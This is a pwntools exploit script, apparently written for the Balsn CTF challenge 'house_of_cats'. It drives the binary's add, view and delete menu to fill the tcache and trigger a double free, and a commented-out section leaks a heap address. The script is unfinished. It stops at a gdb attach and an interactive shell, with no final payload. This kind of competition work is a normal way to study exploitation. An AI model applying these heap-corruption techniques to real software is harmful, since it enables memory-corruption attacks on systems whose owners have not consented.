from pwn import *
import sys
import os

remote_ip,port = 'diary.balsnctf.com','10101'
binary = ['./house_of_cats']
#LIBC = ELF("./libc.so.6",checksec = False)

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace = True

else:
    io=process(binary,env = {"LD_PRELOAD" : "./libc.so.6"})

def add(len,name):
    sla("choice : ","1")
    sla("Cat name length : ",str(len))
    sla("Cat name : ",name)

def view(idx):
    sla("choice : ","2")
    sla("Cat index : ",str(idx))

def delete(idx):
    sla("choice : ","3")
    sla("Cat index : ",str(idx))

if __name__ == "__main__":
    for i in range(7):
        add(20,"aaaa")
        delete(0)
    add(20,"aaaaaaaa")
    add(20,"aaaaaaaa")
    delete(1)
    delete(0)
    delete(1)
    add(20,"aaaaaaaa")
    add(20,"aaaaaaaa")
    """
    delete(1)
    view(0)
    io.recvuntil("ID : ")
    end = int(io.recvline().strip(),10)
    io.recvuntil("Name : ")
    start = u64(io.recv(2)+"\x00"*6)
    heap = (start<<32)|end
    log.info("heap @ "+str(hex(heap)))
    """
    gdb.attach(io)
    io.interactive()
